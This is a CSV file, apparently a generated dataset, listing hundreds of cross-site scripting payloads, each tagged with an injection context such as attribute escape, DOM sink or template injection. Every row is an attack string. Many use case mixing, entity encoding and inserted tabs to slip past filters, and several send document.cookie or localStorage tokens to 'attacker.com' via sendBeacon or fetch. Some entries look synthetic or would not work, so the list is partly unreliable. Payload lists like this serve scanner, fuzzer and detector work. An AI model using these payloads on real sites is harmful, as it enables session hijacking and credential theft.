payload,context
OndRagOveR=jAvaScrIpt:prOmpT(lOcaTioN.hAsh),event_handler
"""><img src=x onpause=confirm('XSS')>",attribute_escape
' ><svG oNtoUchMovE=pRomPt('XSS')>,attribute_escape
<diV oNpaUse=coNfiRm(LocAtiOn.HasH)/>,tag_injection
"Object.assign(window,{""onanimationcancel"":alert})",dom_sink
%22 ><svg ontouchend=confirm(%27XSS%27)>,attribute_escape
"Object.assign(window,{""oncontextmenu"":confirm})",dom_sink
%22><tr onanimationend=prompt(%27XSS%27)>,tag_injection
&quOt; onWebKitTraNsiTioNenD=cOnfIrm(loCatIon.haSh) x=&quOt;,attribute_escape
onkeydown=javascript:alert(%27XSS%27),event_handler
"""><Img srC=x onMouSedOwn=alErt(loCatIon.haSh)>",attribute_escape
"__proto__[""onbeforetoggle""]=XMLHttpRequest(document.domain)",dom_sink
"""><Img srC=x onDroP=pRomPt('XSS')>",attribute_escape
%3Ctitle	onblur=console.log(location.hash)%3E,tag_injection
<animate src=x onpageshow=console.log(%27XSS%27)>,tag_injection
<mt&#101;xt on&#101;nd&#101;d=confirm(docum&#101;nt.dom&#97;in)/>,tag_injection
'><Img srC=x onMouSedOwn=coNsoLe.Log('XSS')>,attribute_escape
"__proto__[""onsecuritypolicyviolation""]=eval(localStorage.getItem('token'))",dom_sink
"""><img src=x onmous&#101;wh&#101;&#101;l=prompt(docum&#101;nt.dom&#97;in)>",attribute_escape
<m&#101;t&#97;/ontr&#97;nsitionst&#97;rt=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection
<audio onmouseover=console.log('XSS')/>,tag_injection
onclose=console.log/*x*/(%27XSS%27),event_handler
" onpagereveal=alert(String.fromCharCode(88,83,83))",event_handler
"Obj&#101;ct.&#97;ssign(window,{""on&#97;uxclick"":prompt})",dom_sink
"' %3E%3Csvg onmouseup=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape
<blink onk&#101;ypr&#101;ss=prompt(docum&#101;nt.dom&#97;in) onk&#101;ypr&#101;ss=prompt(docum&#101;nt.dom&#97;in)>,tag_injection
<object src=x onvolumechange=alert(1)>,tag_injection
{alErt doCumEnt.coOkiE},template_injection
""" %3E%3Csvg onanimationend=confirm(1)%3E",attribute_escape
' %3E%3Csvg onpopstate=alert(location.hash)%3E,attribute_escape
"""><img src=x onanimationend=alert(String.fromCharCode(88,83,83))>",attribute_escape
""" %3E%3Csvg onplaying=alert(String.fromCharCode(88,83,83))%3E",attribute_escape
"%22 onanimationiteration=confirm(String.fromCharCode(88,83,83)) %22",attribute_escape
`><img src=x onpl&#97;y=confirm(docum&#101;nt.dom&#97;in)>,attribute_escape
""" onfocus=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) &#97;utofocus=""",attribute_escape
onstalled=javascr	ipt:confirm(location.hash),event_handler
`><img src=x onbeforecut=\u0061lert(document.domain)>,attribute_escape
	onCopY=pRomPt(1),event_handler
onfocusin=prompt/*x*/(loc&#97;tion.h&#97;sh),event_handler
`%3E%3Cimg src=x oninput=confirm(1)%3E,attribute_escape
""" %3E%3Csvg onpopstate=confirm(document.domain)%3E",attribute_escape
%22 ><svg onpageswap=alert(document.domain)>,attribute_escape
"<script>//\u0061lert(String.fromCharCode(88,83,83))</script>",script_injection
""" ><svg onpageswap=console.log(String.fromCharCode(88,83,83))>",attribute_escape
`><img src=x onp&#97;g&#101;show=consol&#101;.log('XSS')>,attribute_escape
&quot; onp&#97;g&#101;r&#101;v&#101;&#97;l=prompt(loc&#97;tion.h&#97;sh) x=&quot;,attribute_escape
"element.setAttribute(""onclick"",""confirm(location.hash)"")",dom_sink
"element.insertAdjacentHTML(%22beforeend%22,%22<img src=x onerror=prompt(String.fromCharCode(88,83,83))>%22)",dom_sink
onload=confirm/**/(location.hash),event_handler
`><img src=x onp&#97;g&#101;r&#101;v&#101;&#97;l=prompt(loc&#97;tion.h&#97;sh)>,attribute_escape
' oNpaGehIde=coNsoLe.Log(doCumEnt.doMaiN) ',attribute_escape
"""%3E%3Cmtext onended=confirm(document.domain)%3E",tag_injection
""" ontouchmov&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in) """,attribute_escape
"EleMenT.iNseRtADjaCenTHTML(""beForEenD"",""<iMg Src=x OneRroR=eVal(naVigAtoR.sEndBeaCon('//atTacKer.coM',DocUmeNt.CooKie))>"")",dom_sink
`><Img srC=x onErrOr=AleRt(DocUmeNt.DomAin)>,attribute_escape
"""><select onsecuritypolicyviolation=confirm(location.hash)>",tag_injection
"\"" OndRagEntEr=ConFirM('XSS')//",attribute_escape
{{[].pOp.ConStrUctOr('coNfiRm(DocUmeNt.CooKie)')()}},template_injection
"EleMenT.sEtATtrIbuTe(""onCliCk"",""cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))"")",dom_sink
"onp&#97;g&#101;r&#101;v&#101;&#97;l=&#97;l&#101;rt&#40;String.fromCh&#97;rCod&#101;(88,83,83)&#41;",event_handler
onk&#101;ydown=confirm('XSS'),event_handler
"__pRotO__[""oNanImaTioNenD""]=coNsoLe.Log(loCalStoRagE.gEtITem('tOkeN'))",dom_sink
<script>alert`'XSS'`</script>,script_injection
"ontoggle=confirm/**/(String.fromCharCode(88,83,83))",event_handler
[#\u0061lert document.domain /],template_injection
"ObjEct.asSigN(wIndOw,{""oNpoIntErrAwuPdaTe"":feTch})",dom_sink
""" %3E%3Csvg onclose=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape
"<tiTle
onMozFulLscReeNchAngE=pRomPt('XSS')>",tag_injection
oncut=\u0061lert/*x*/(1),event_handler
onsubmit=confirm&#40;document.domain&#41;,event_handler
""" ><svg onscrollsn&#97;pch&#97;ng&#101;=consol&#101;.log(1)>",attribute_escape
""" ><svg ontouch&#101;nd=consol&#101;.log('XSS')>",attribute_escape
' %3E%3Csvg ondragstart=console.log(document.domain)%3E,attribute_escape
JavAscRipT:pRomPt/***/(1),js_uri
""" ><svg ons&#101;l&#101;ct=prompt(1)>",attribute_escape
"	onp&#97;st&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
"""%3E%3Cimg src=x ongesturestart=prompt('XSS')%3E",attribute_escape
"document.body.innerHTML=""%3Cimg src=x onerror=console.log(location.hash)%3E""",dom_sink
"document.write(""%3Cimg src=x onerror=eval(1)%3E"")",dom_sink
"ObjEct.asSigN(wIndOw,{""oNmoUseWheEl"":feTch})",dom_sink
"__pRotO__[""oNwaItiNg""]=pRomPt(DocUmeNt.CooKie)",dom_sink
" onbegin=confirm(String.fromCharCode(88,83,83))",event_handler
"""><meta onsecuritypolicyviolation=prompt('XSS')>",tag_injection
""" ><svg ongotpointercapture=console.log(document.domain)>",attribute_escape
<link ondrop=prompt(docum&#101;nt.dom&#97;in)>,tag_injection
"document.querySelector(%22body%22).innerHTML+=%22prompt(String.fromCharCode(88,83,83))%22",dom_sink
<listing src=x onkeyup=\u0061lert(location.hash)>,tag_injection
"""><td onmozfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log(loc&#97;tion.h&#97;sh)>",tag_injection
<noscript src=x onbeforematch=console.log(%27XSS%27)>,tag_injection
{{$on.constructor('\u0061lert('XSS')')()}},template_injection
"\"" OncAnpLay=coNfiRm(LocAtiOn.HasH)//",attribute_escape
"""%3E%3Cimg src=x ondblclick=console.log('XSS')%3E",attribute_escape
"Obj&#101;ct.&#97;ssign(window,{""onblur"":confirm})",dom_sink
<!--><title onstalled=\u0061lert('XSS')>,tag_injection
<boDy OncLosE=cOnsOle.loG('XSS')>,tag_injection
window[%22fetch%22](%27//attacker.com/?c=%27+document.cookie),dom_sink
"<meta x=y onhashchange=confirm(String.fromCharCode(88,83,83))>",tag_injection
{{$on.constructor('prompt(1)')()}},template_injection
<viDeo onMozFulLscReeNchAngE=pRomPt('XSS') onMozFulLscReeNchAngE=pRomPt('XSS')>,tag_injection
""" on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
%3Cmtext	onmousedown=console.log(1)%3E,tag_injection
<t&#97;bl&#101; oncopy=confirm('XSS') oncopy=confirm('XSS')>,tag_injection
	onlo&#97;d=consol&#101;.log(docum&#101;nt.dom&#97;in),event_handler
"document.body.innerHTML=""<img src=x onerror=\u0061lert(String.fromCharCode(88,83,83))>""",dom_sink
%22><img src=x ondragstart=console.log(document.domain)>,attribute_escape
"%3Ctitle
onstalled=alert('XSS')%3E",tag_injection
"SetIntErvAl(""prOmpT(dOcuMenT.dOmaIn)"",100)",dom_sink
\' onpromptdismiss=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)//,attribute_escape
<!--><base oninvalid=confirm(location.hash)>,tag_injection
%3Cobject src=x onvolumechange=alert(1)%3E,tag_injection
<embed x=y onmouseenter=confirm('XSS')>,tag_injection
""" ><svG oNtoUchStaRt=ProMpt(doCumEnt.doMaiN)>",attribute_escape
"' ><svG oNhaShcHanGe=ConFirM(STriNg.FroMChArCOde(88,83,83))>",attribute_escape
"&quot; ondblclick=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) x=&quot;",attribute_escape
%3Cscript%3Econfirm`location.hash`%3C/script%3E,script_injection
'><Img srC=x onInpUt=ConFirM(1)>,attribute_escape
%27 ><svg onpointerdown=alert(document.domain)>,attribute_escape
%22><animate onpageshow=console.log(%27XSS%27)>,tag_injection
"Obj&#101;ct.&#97;ssign(window,{""onmous&#101;&#101;nt&#101;r"":f&#101;tch})",dom_sink
<scRipT>/*/pRomPt(1)</scRipT>,script_injection
<tr onpointerrawupdate=alert(location.hash)>,tag_injection
"' %3E%3Csvg ontransitionrun=alert(String.fromCharCode(88,83,83))%3E",attribute_escape
{{constructor['constructor']('prompt(document.domain)')()}},template_injection
%27><img src=x onanimationiteration=console.log(%27XSS%27)>,attribute_escape
<scRipT>/X/cOnfIrm(doCumEnt.doMaiN)</scRipT>,script_injection
	ons&#101;l&#101;ct=consol&#101;.log(docum&#101;nt.dom&#97;in),event_handler
%27 ><svg onstalled=prompt(1)>,attribute_escape
"EleMenT.iNseRtADjaCenTHTML(""beForEenD"",""<iMg Src=x OneRroR=aLerT('XSS')>"")",dom_sink
java	scr	ipt:alert(1),js_uri
<blInk/onKeyPreSs=ProMpt(doCumEnt.doMaiN)>,tag_injection
"s&#101;tInt&#101;rv&#97;l(""&#101;v&#97;l(loc&#97;tion.h&#97;sh)"",100)",dom_sink
OntRanSitIonStaRt=ConSolE.lOg&#40;'XSS'&#41;,event_handler
'><Img srC=x onPoiNteRraWupDatE=aLerT('XSS')>,attribute_escape
<scr	ipt>/*/alert('XSS')</scr	ipt>,script_injection
"' %3E%3Csvg oncut=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape
OncUt=JavAscRipT:aLerT(dOcuMenT.dOmaIn),event_handler
<sp&#97;n/ons&#101;curitypolicyviol&#97;tion=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection
<script>console.log(document.domain)</script>,script_injection
%3C!--%3E%3Cxss onmouseover=console.log('XSS')%3E,tag_injection
"' %3E%3Csvg onanimationstart=alert(String.fromCharCode(88,83,83))%3E",attribute_escape
""" onwebkitfullscreenchange=alert('XSS') """,attribute_escape
"window[""confirm""]('//attacker.com/?c='+document.cookie)",dom_sink
<&#101;mb&#101;d src=x onmozfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection
"__pRotO__[""oNmoUseUp""]=cOnfIrm(naVigAtoR.sEndBeaCon('//atTacKer.coM',DocUmeNt.CooKie))",dom_sink
"""><obj&#101;ct onw&#101;bkit&#97;nim&#97;tion&#101;nd=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",tag_injection
onerror=javascript:console.log(%27XSS%27),event_handler
on&#97;uxclick=j&#97;v&#97;script:prompt('XSS'),event_handler
' oNbeGin=coNfiRm(LocAtiOn.HasH) ',attribute_escape
%22 ondrop=confirm(1) %22,attribute_escape
%27 onbeforepaste=prompt(1) %27,attribute_escape
%27 onmousedown=console.log(%27XSS%27) %27,attribute_escape
`><img src=x onmousedown=confirm(document.domain)>,attribute_escape
"<foRm OnwEbkItfUllScrEenChaNge=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
	onPoiNteRup=prOmpT(dOcuMenT.dOmaIn),event_handler
&quOt; onDroP=aLerT('XSS') X=&QuoT;,attribute_escape
(new Function(%22XMLHttpRequest(btoa(document.cookie))%22))();,dom_sink
<t&#97;bl&#101; ons&#101;l&#101;ct=prompt(1)/>,tag_injection
OnpAgeShoW=pRomPt(1),event_handler
%27 ><svg onscrollsnapchange=prompt(location.hash)>,attribute_escape
"""><scr	ipt>alert(location.hash)</scr	ipt>",script_injection
<iframe onsecuritypolicyviolation=confirm('XSS') onsecuritypolicyviolation=confirm('XSS')>,tag_injection
<base	ontransitionstart=prompt(location.hash)>,tag_injection
`><img src=x onch&#97;ng&#101;=consol&#101;.log(1)>,attribute_escape
"&#101;v&#97;l(""XMLHttpR&#101;qu&#101;st(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)"")",dom_sink
"""%3E%3Cimg src=x onplay=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape
"element.insertAdjacentHTML(%22beforeend%22,%22<img src=x onerror=console.log(%27XSS%27)>%22)",dom_sink
""" oNanImaTioNenD=cOnfIrm(1) """,attribute_escape
&quot; ontouch&#101;nd=confirm('XSS') x=&quot;,attribute_escape
"&quot; onmozfullscr&#101;&#101;nch&#97;ng&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) x=&quot;",attribute_escape
\' OnpOinTerCanCel=prOmpT(1)//,attribute_escape
%27><img src=x onended=prompt(%27XSS%27)>,attribute_escape
"<scRipT
>AleRt(1)</scRipT>",script_injection
<!--><body onclose=console.log('XSS')>,tag_injection
"__pRotO__[""oNmoUseOveR""]=prOmpT(dOcuMenT.dOmaIn)",dom_sink
"SetTimEouT(""ConSolE.lOg(BtoA(dOcuMenT.cOokIe))"",0)",dom_sink
OnsCroLleNd=ProMpt/*x*/(DocUmeNt.DomAin),event_handler
"__proto__[""onfocusin""]=fetch(localStorage.getItem('token'))",dom_sink
"<div onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection
"<video x=y onpaste=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection
' ontoggle=prompt(1) ',attribute_escape
%3Cvideo onclick=console.log('XSS')%3E,tag_injection
"""><form onr&#101;s&#101;t=consol&#101;.log(docum&#101;nt.dom&#97;in)>",tag_injection
<&#97;udio/oninput=prompt(loc&#97;tion.h&#97;sh)>,tag_injection
"ObjEct.asSigN(wIndOw,{""oNbeForEcoPy"":coNsoLe.Log})",dom_sink
"onfocus=prompt&#40;String.fromCh&#97;rCod&#101;(88,83,83)&#41;",event_handler
"setTimeout(""console.log(btoa(document.cookie))"",0)",dom_sink
%3Caudio oninput=prompt(location.hash)%3E,tag_injection
OnaNimAtiOneNd=ConSolE.lOg('XSS'),event_handler
'><Img srC=x onAniMatIonIteRatIon=prOmpT(1)>,attribute_escape
<title/onclick=confirm('XSS')>,tag_injection
\%22 onfocusout=alert(location.hash)//,attribute_escape
%22 ><svg onsearch=prompt(document.domain)>,attribute_escape
\' onb&#101;for&#101;m&#97;tch=confirm(loc&#97;tion.h&#97;sh)//,attribute_escape
<listing	ontransitionstart=confirm(document.domain)>,tag_injection
"Object.assign(window,{%22onpointerdown%22:alert})",dom_sink
<!--><td on&#101;nd=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection
<liStiNg/OntRanSitIonStaRt=ConFirM(dOcuMenT.dOmaIn)>,tag_injection
' ><svG oNpaGehIde=coNfiRm(1)>,attribute_escape
"__proto__[%22onrepeat%22]=console.log(navigator.sendBeacon(%27//attacker.com%27,document.cookie))",dom_sink
"Object.assign(window,{%22ontouchmove%22:eval})",dom_sink
"window[""confirm""](String.fromCh&#97;rCod&#101;(88,83,83))",dom_sink
' %3E%3Csvg onbeforetoggle=console.log('XSS')%3E,attribute_escape
<button onclick=console.log(1)/>,tag_injection
&quot; onwebkitanimationend=prompt(1) x=&quot;,attribute_escape
"`%3E%3Cimg src=x onbeforematch=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape
"<animatemotion
onsecuritypolicyviolation=console.log(%27XSS%27)>",tag_injection
""" ondragstart=console.log(location.hash) """,attribute_escape
"<mtext
onstalled=console.log(document.domain)>",tag_injection
""" ><svG oNfoCusOut=alErt(loCatIon.haSh)>",attribute_escape
"EleMenT.sEtATtrIbuTe(""onCliCk"",""XMLHTtpReqUesT(dOcuMenT.dOmaIn)"")",dom_sink
<sp&#97;n src=x oncopy=prompt(loc&#97;tion.h&#97;sh)>,tag_injection
""" ><svg onmousewheel=console.log(1)>",attribute_escape
' ontouchmove=confirm(document.domain) ',attribute_escape
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=XMLHttpR&#101;qu&#101;st(bto&#97;(docum&#101;nt.cooki&#101;))>"")",dom_sink
"%27><img src=x oncanplay=confirm(String.fromCharCode(88,83,83))>",attribute_escape
onscrollend=\u0061lert/***/('XSS'),event_handler
&quot; ontransitionend=\u0061lert(document.domain) x=&quot;,attribute_escape
%3Cmarquee onauxclick=confirm(location.hash)/%3E,tag_injection
"%22 oncopy=alert(String.fromCharCode(88,83,83)) %22",attribute_escape
OnpLayIng=jaVasCriPt:AleRt(1),event_handler
"&#101;l&#101;m&#101;nt.ins&#101;rtAdj&#97;c&#101;ntHTML(""b&#101;for&#101;&#101;nd"",""<img src=x on&#101;rror=consol&#101;.log('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)>"")",dom_sink
""" oNseArcH=aLerT('XSS') """,attribute_escape
"OnrEpeAt=AleRt&#40;StRinG.fRomChaRCoDe(88,83,83)&#41;",event_handler
<anImaTemOtiOn OnaNimAtiOniTerAtiOn=ConSolE.lOg('XSS') onAniMatIonIteRatIon=coNsoLe.Log('XSS')>,tag_injection
"\' OnsCroLlsNapChaNge=prOmpT(STriNg.FroMChArCOde(88,83,83))//",attribute_escape
oncont&#101;xtm&#101;nu=confirm&#40;'XSS'&#41;,event_handler
"javascr	ipt:void(confirm(String.fromCharCode(88,83,83)))",js_uri
	onMozFulLscReeNchAngE=pRomPt(1),event_handler
"data:text/html,%3Cscript%3Eprompt(document.domain)%3C/script%3E",js_uri
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=XMLHTtpReqUesT('XSS')>"")",dom_sink
OngEstUreStaRt=ConSolE.lOg/**/(loCatIon.haSh),event_handler
%3Cnoscript onbeforematch=console.log('XSS')/%3E,tag_injection
<seT oNpoIntErmOve=coNfiRm(LocAtiOn.HasH)/>,tag_injection
<body/onb&#101;for&#101;cut=confirm(docum&#101;nt.dom&#97;in)>,tag_injection
javascript:confirm/**/(1),js_uri
${prompt?n&#101;w()('docum&#101;nt.dom&#97;in')},template_injection
"%27><img src=x ondblclick=console.log(String.fromCharCode(88,83,83))>",attribute_escape
<seT/oNenD=aLerT(1)>,tag_injection
""" %3E%3Csvg onblur=alert(document.domain)%3E",attribute_escape
"""><img src=x onbegin=confirm(location.hash)>",attribute_escape
"__proto__[""ong&#101;stur&#101;st&#97;rt""]=&#101;v&#97;l(loc&#97;tion.h&#97;sh)",dom_sink
<script>Function('console.log(document.domain)')();</script>,script_injection
' ><svG oNpoIntEruP=aLerT(1)>,attribute_escape
"""><&#97;nim&#97;t&#101;motion onw&#97;iting=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",tag_injection
"OngEstUreEnd=coNfiRm/**/(StRinG.fRomChaRCoDe(88,83,83))",event_handler
<imG oNreSet=coNsoLe.Log(doCumEnt.doMaiN) OnrEseT=cOnsOle.loG(dOcuMenT.dOmaIn)>,tag_injection
\' onwh&#101;&#101;l=consol&#101;.log(docum&#101;nt.dom&#97;in)//,attribute_escape
ontr&#97;nsitionst&#97;rt=confirm&#40;loc&#97;tion.h&#97;sh&#41;,event_handler
"%3Cdialog
onplay=prompt(document.domain)%3E",tag_injection
%27><img src=x onpagehide=confirm(1)>,attribute_escape
{confirm document.domain},template_injection
""" onscrollsn&#97;pch&#97;ng&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
"%27><img src=x onplaying=confirm(String.fromCharCode(88,83,83))>",attribute_escape
<diAloG/oNpoIntEroVer=coNfiRm(1)>,tag_injection
""" ><svG oNprOmpTacTioN=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape
"""%3E%3Canimatemotion onsecuritypolicyviolation=console.log('XSS')%3E",tag_injection
"""%3E%3Cimg src=x onselect=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape
""" %3E%3Csvg onbegin=confirm(1)%3E",attribute_escape
"""><img src=x ongesturestart=alert(1)>",attribute_escape
"onkeydown=javascr	ipt:prompt(String.fromCharCode(88,83,83))",event_handler
__proto__[%22onload%22]=XMLHttpRequest(document.cookie),dom_sink
' ><svg onerror=\u0061lert(1)>,attribute_escape
"""><img src=x onb&#101;for&#101;p&#97;st&#101;=consol&#101;.log('XSS')>",attribute_escape
__proto__[%22oncut%22]=eval(1),dom_sink
'><Img srC=x onPagEreVeaL=pRomPt(LocAtiOn.HasH)>,attribute_escape
__proto__[%22onended%22]=prompt(document.domain),dom_sink
""" ><svG oNdrOp=ConFirM(dOcuMenT.dOmaIn)>",attribute_escape
' on&#101;nd&#101;d=&#97;l&#101;rt('XSS') ',attribute_escape
onpointerdown=prompt&#40;1&#41;,event_handler
' ><svg ontransitionend=alert(document.domain)>,attribute_escape
"location=""javascript:eval(btoa(document.cookie))""",dom_sink
 onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt('XSS'),event_handler
"\"" onp&#97;us&#101;=confirm('XSS')//",attribute_escape
	onr&#101;s&#101;t=confirm('XSS'),event_handler
%3Ctitle	onclick=confirm('XSS')%3E,tag_injection
"<dialog
onpointerover=confirm(1)>",tag_injection
<script onpoint&#101;rr&#97;wupd&#97;t&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in) onpoint&#101;rr&#97;wupd&#97;t&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection
"<s&#101;t
onpoint&#101;rmov&#101;=confirm(loc&#97;tion.h&#97;sh)>",tag_injection
"element.setAttribute(%22onclick%22,%22prompt(1)%22)",dom_sink
\' onscrollsn&#97;pch&#97;ng&#101;=&#97;l&#101;rt('XSS')//,attribute_escape
' oNseArcH=pRomPt(LocAtiOn.HasH) ',attribute_escape
%27><img src=x onhashchange=alert(%27XSS%27)>,attribute_escape
"loc&#97;tion.hr&#101;f=""j&#97;v&#97;script:prompt(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)""",dom_sink
OnpAgeHidE=cOnfIrm(loCatIon.haSh),event_handler
"""><ScrIpt>alErt(loCatIon.haSh)</sCriPt>",script_injection
"'%3E%3Cimg src=x onanimationiteration=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape
"""><Img srC=x onPlaY=cOnfIrm('XSS')>",attribute_escape
&quot; onpoint&#101;rmov&#101;=prompt(loc&#97;tion.h&#97;sh) x=&quot;,attribute_escape
%3Cset x=y oncanplay=confirm(1)%3E,tag_injection
<tr	onpointerrawupdate=alert(location.hash)>,tag_injection
onwebkitanimationend=confirm&#40;document.domain&#41;,event_handler
""" ><svg onmous&#101;ov&#101;r=prompt(docum&#101;nt.dom&#97;in)>",attribute_escape
<td x=y onstalled=confirm(%27XSS%27)>,tag_injection
"%3Cplaintext onpause=console.log(String.fromCharCode(88,83,83)) onpause=console.log(String.fromCharCode(88,83,83))%3E",tag_injection
<noscript onpoint&#101;rdown=prompt(docum&#101;nt.dom&#97;in) onpoint&#101;rdown=prompt(docum&#101;nt.dom&#97;in)>,tag_injection
%3Cbody onclose=console.log('XSS')/%3E,tag_injection
<audio src=x onscrollend=prompt(location.hash)>,tag_injection
	onp&#97;st&#101;=confirm(docum&#101;nt.dom&#97;in),event_handler
<!--><MatH oNmoUseUp=ConSolE.lOg(DocUmeNt.DomAin)>,tag_injection
"%3Cxss onanimationstart=confirm(String.fromCharCode(88,83,83))%3E",tag_injection
"""><img src=x onpaste=confirm(String.fromCharCode(88,83,83))>",attribute_escape
document.querySelector(%22body%22).innerHTML+=%22prompt(1)%22,dom_sink
"document.querySelector(""body"").innerHTML+=""XMLHttpRequest(document.cookie+'&loc='+location.href)""",dom_sink
onplay=console.log(1),event_handler
%22 ><svg onanimationiteration=console.log(%27XSS%27)>,attribute_escape
"LocAtiOn=""jaVasCriPt:ProMpt(loCatIon.haSh)""",dom_sink
%3Ctable	ontouchend=prompt(document.domain)%3E,tag_injection
%3Cvideo src=x ondragstart=alert('XSS')%3E,tag_injection
{% confirm docum&#101;nt.cooki&#101; %},template_injection
' oNfoCus=coNsoLe.Log(loCatIon.haSh) ',attribute_escape
"'><Img srC=x onPlaYinG=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape
"\%27 onpromptdismiss=prompt(String.fromCharCode(88,83,83))//",attribute_escape
"&quOt; onHasHchAngE=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83)) x=&qUot;",attribute_escape
`%3E%3Cimg src=x ontouchmove=confirm('XSS')%3E,attribute_escape
&quOt; onPoiNteRraWupDatE=aLerT(lOcaTioN.hAsh) x=&qUot;,attribute_escape
"""><Img srC=x onEndEd=AleRt(1)>",attribute_escape
java	script:confirm(1),js_uri
%22><video onclick=console.log(%27XSS%27)>,tag_injection
' ><svg ontouch&#101;nd=confirm('XSS')>,attribute_escape
`><img src=x ontouchmove=confirm(%27XSS%27)>,attribute_escape
"Object.assign(window,{%22onpageshow%22:eval})",dom_sink
onh&#97;shch&#97;ng&#101;=confirm/**/('XSS'),event_handler
' ondrop=&#97;l&#101;rt('XSS') ',attribute_escape
"<marquee onclose=confirm(String.fromCharCode(88,83,83)) onclose=confirm(String.fromCharCode(88,83,83))>",tag_injection
"ObjEct.asSigN(wIndOw,{""oNdrAgoVer"":pRomPt})",dom_sink
%27><img src=x onpointerover=console.log(%27XSS%27)>,attribute_escape
<maRquEe X=y onPopStaTe=AleRt('XSS')>,tag_injection
&quot; ondrop=&#97;l&#101;rt('XSS') x=&quot;,attribute_escape
"Object.assign(window,{%22onreset%22:XMLHttpRequest})",dom_sink
\' onauxclick=confirm(location.hash)//,attribute_escape
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=consol&#101;.log(docum&#101;nt.dom&#97;in)>"")",dom_sink
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>"")",dom_sink
""" oNmoUseWheEl=ConSolE.lOg(1) """,attribute_escape
`><img src=x onb&#101;for&#101;m&#97;tch=confirm(loc&#97;tion.h&#97;sh)>,attribute_escape
"ongotpoint&#101;rc&#97;ptur&#101;=consol&#101;.log&#40;String.fromCh&#97;rCod&#101;(88,83,83)&#41;",event_handler
`><img src=x onsecuritypolicyviolation=console.log(%27XSS%27)>,attribute_escape
""" ><svG oNanImaTioNitEraTioN=aLerT(STriNg.FroMChArCOde(88,83,83))>",attribute_escape
"__proto__[""onwebkittransitionend""]=\u0061lert(localStorage.getItem('token'))",dom_sink
' ><svg onpoint&#101;rc&#97;nc&#101;l=consol&#101;.log(docum&#101;nt.dom&#97;in)>,attribute_escape
' onp&#97;g&#101;hid&#101;=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) ',attribute_escape
"'><img src=x on&#101;rror=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
